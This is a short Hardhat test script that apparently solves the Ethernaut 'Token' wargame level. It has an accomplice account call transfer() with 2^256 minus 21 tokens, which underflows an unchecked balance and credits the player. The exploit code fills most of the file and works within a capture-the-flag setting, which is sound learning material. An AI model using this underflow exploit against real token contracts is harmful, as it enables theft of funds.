import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { setupChallenge, submitLevel } from "./utils";
import { TOKEN_LEVEL_ADDRESS } from "./constants";
import { expect } from "chai";

// TODO: write the challenge description here

describe("Token", () => {
  let eoa: Signer;
  let accomplice: Signer;
  let challenge: Contract;

  before(async () => {
    const contractLevel = TOKEN_LEVEL_ADDRESS;
    const contractName = "Token";
    ({ challenge } = await setupChallenge(contractLevel, { contractName }));
    [eoa, accomplice] = await ethers.getSigners();
  });

  it("solves the challenge", async () => {
    const eoaAddress = await eoa.getAddress();
    const maxValue = BigNumber.from(2).pow(256);
    // Since we're given an initial 20 tokens, subtract 21 from maxValue to extract maximum value and prevent overflow
    await challenge.connect(accomplice).transfer(eoaAddress, maxValue.sub(21));
  });

  after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true;
  });
});
